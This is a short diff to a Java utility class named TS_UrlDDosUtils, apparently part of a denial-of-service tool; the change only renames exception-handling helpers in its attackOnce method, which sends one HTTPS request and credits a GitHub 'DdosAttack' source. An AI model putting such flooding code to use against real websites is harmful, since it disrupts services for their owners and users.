@@ -21,7 +21,7 @@ public class TS_UrlDDosUtils {
     }
 
     public static void attackOnce(String urlString, String paramPair) {
-        var url = TGS_UnSafe.call(() -> new URL(urlString), e -> null);
+        var url = TGS_FuncMTCEUtils.call(() -> new URL(urlString), e -> null);
         HttpsURLConnection con = null;
         try {//https://github.com/Abdelaziz-Khabthani/Ddos-java/blob/master/DdosAttack.java
             con = (HttpsURLConnection) url.openConnection();
@@ -36,7 +36,7 @@ public class TS_UrlDDosUtils {
             System.out.println("getResponseCode:" + con.getResponseCode());
             con.getInputStream();
         } catch (Exception e) {
-            TGS_UnSafe.throwIfInterruptedException(e);
+            TGS_FuncUtils.throwIfInterruptedException(e);
             d.ce("attackOnce", e.getMessage());
         } finally {
             if (con != null) {
